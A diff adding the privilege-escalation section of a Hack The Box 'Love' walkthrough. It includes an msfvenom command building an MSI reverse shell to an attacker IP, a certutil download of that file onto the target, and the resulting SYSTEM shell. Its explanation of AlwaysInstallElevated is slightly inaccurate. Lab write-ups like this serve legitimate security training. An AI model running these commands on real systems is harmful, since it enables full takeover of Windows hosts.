@@ -290,8 +290,43 @@ We spawned a shell as user ```phoebe```. Lets go ahead and escalate our privileg
 
 # Privilege Escalation
 
+Running winpeas I saw that the ```AlwaysInstallElevated``` registry keys was set to True.
+
+When the ```AlwaysInstallElevated``` registry key is set to true (or 1), it means that any software installation initiated by a user with administrative privileges will run with elevated privileges, regardless of the permissions of the user initiating the installation. This effectively forces the installation to occur with full administrative rights.
+
+We'll be exploiting this using a malicious MSI (Windows Installer file). We can generate this using msfvenom
+
+command:```msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.30 LPORT=1337 -f msi > abeg.msi```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/love]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.30 LPORT=1337 -f msi > abeg.msi   
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of msi file: 159744 bytes
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/love]
+└─$ ls -l abeg.msi 
+-rw-r--r-- 1 bl4ck4non bl4ck4non 159744 Oct 14 20:32 abeg.msi
+```
+Lets send this over to the target machine using ```certutil```
+
+command:```certutil -urlcache -f http://10.10.16.30/abeg.msi abeg.msi```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d4d9c834-187c-4484-8061-76d7b8b387c2)
+
+Ensure you set up your netcat listener before running the executable
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/61bcdcdc-c9db-4e15-b862-5810c36fe43c)
+
+We spawned a shell as ```nt authority\system```. We have successfully pwned this box😎
 
 
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
